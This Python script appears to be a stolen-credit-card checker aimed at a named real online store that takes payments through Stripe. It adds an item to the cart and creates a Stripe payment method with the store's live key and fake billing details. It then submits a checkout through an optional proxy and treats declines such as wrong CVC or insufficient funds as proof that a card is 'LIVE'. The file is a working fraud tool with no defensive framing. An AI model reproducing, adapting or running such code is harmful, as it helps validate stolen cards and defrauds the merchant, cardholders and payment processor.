import requests, re, random, string

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

# Stripe decline codes that indicate the card is valid (live)
LIVE_DECLINE_CODES = [
    "incorrect_cvc", "incorrect_number", "expired_card",
    "insufficient_funds", "do_not_honor", "fraudulent",
    "generic_decline", "restricted_card", "pickup_card",
    "service_not_allowed", "transaction_not_allowed",
    "try_again_later", "withdrawal_count_limit_exceeded",
]

def check_st2(cc, mm, yy, cvv, proxy=None):
    try:
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        email = generate_random_email()
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

        # --- 1. Add to cart via direct URL (reliable) ---
        cart_url = (
            "https://1337decals.com/?add-to-cart=45810"
            "&variation_id=45816"
            "&attribute_pa_color=copper"
        )
        resp_cart = session.get(cart_url, headers={'User-Agent': ua}, timeout=15)
        # WooCommerce redirects to cart after adding; just visit cart page
        session.get('https://1337decals.com/cart/', headers={'User-Agent': ua}, timeout=15)

        # --- 2. Go to checkout ---
        r3 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
        create_nonce = re.search(r'name="woocommerce-process-checkout-nonce".*?value="([^"]+)"', r3.text)
        if not create_nonce:
            return False, "Checkout nonce not found"
        create_nonce = create_nonce.group(1)

        # --- 3. Stripe payment method ---
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua
        }
        stripe_data = (
            f'billing_details[name]=exeee+waysss&billing_details[email]={email}&'
            f'billing_details[phone]=15068596852&billing_details[address][city]=hudson&'
            f'billing_details[address][country]=US&billing_details[address][line1]=steer+62888&'
            f'billing_details[address][line2]=&billing_details[address][postal_code]=10080&'
            f'billing_details[address][state]=NY&type=card&card[number]={cc}&card[cvc]={cvv}&'
            f'card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&'
            f'payment_user_agent=stripe.js%2F12427d159a%3B+stripe-js-v3%2F12427d159a%3B+payment-element%3B+deferred-intent&'
            f'referrer=https%3A%2F%2F1337decals.com&time_on_page=139951&'
            f'key=pk_live_51J33OlCsDrdOCw8hUtYZ1hzzZJodzS7u9TzZjprUNV0Xo7is4ESMqfCF16GfhaFEznspmsackDVbrz80XhmXrLDF00rHzYB1Rt&'
            f'_stripe_version=2024-06-20'
        )
        r4 = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
        pm = r4.json()
        if 'id' not in pm:
            error = pm.get('error', {})
            decline_code = error.get('decline_code', '')
            msg = error.get('message', 'Unknown error')
            if decline_code in LIVE_DECLINE_CODES or "security code" in msg.lower():
                return True, f"LIVE: {msg}"
            return False, f"PM failed: {msg}"
        pm_id = pm['id']

        # --- 4. Process checkout ---
        checkout_data = (
            f'wc_order_attribution_source_type=typein&'
            f'billing_email={email}&billing_first_name=exeee&billing_last_name=waysss&'
            f'billing_company=waysss&billing_country=US&billing_address_1=steer+62888&'
            f'billing_address_2=&billing_city=hudson&billing_state=NY&billing_postcode=10080&'
            f'billing_phone=15068596852&createaccount=1&account_password=jejeoeoeo%C4%B12728&'
            f'payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&'
            f'wc-stripe-is-deferred-intent=1&terms=on&terms-field=1&'
            f'woocommerce-process-checkout-nonce={create_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&'
            f'wc-stripe-payment-method={pm_id}'
        )
        checkout_headers = {
            'authority': '1337decals.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://1337decals.com',
            'referer': 'https://1337decals.com/checkout/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': ua
        }
        r5 = session.post('https://1337decals.com/', params={'wc-ajax': 'checkout'},
                          headers=checkout_headers, data=checkout_data, timeout=20)

        # Check AJAX response for Stripe errors
        try:
            ajax_data = r5.json()
            if 'error' in ajax_data:
                return False, ajax_data['error']
            if 'redirect' in ajax_data and ajax_data['redirect']:
                return True, "Payment successful"
        except:
            pass

        # --- 5. Final result page ---
        r6 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
        error_match = re.search(r'<ul class="woocommerce-error".*?<li>\s*(.*?)\s*<\/li>', r6.text, re.DOTALL)
        if error_match:
            error_text = error_match.group(1).strip()
            if "security code" in error_text.lower() or "cvc" in error_text.lower():
                return True, error_text
            return False, error_text
        if "thank you" in r6.text.lower() or "order received" in r6.text.lower():
            return True, "Payment successful"
        return False, "Unknown response"

    except Exception as e:
        return False, str(e)[:150]
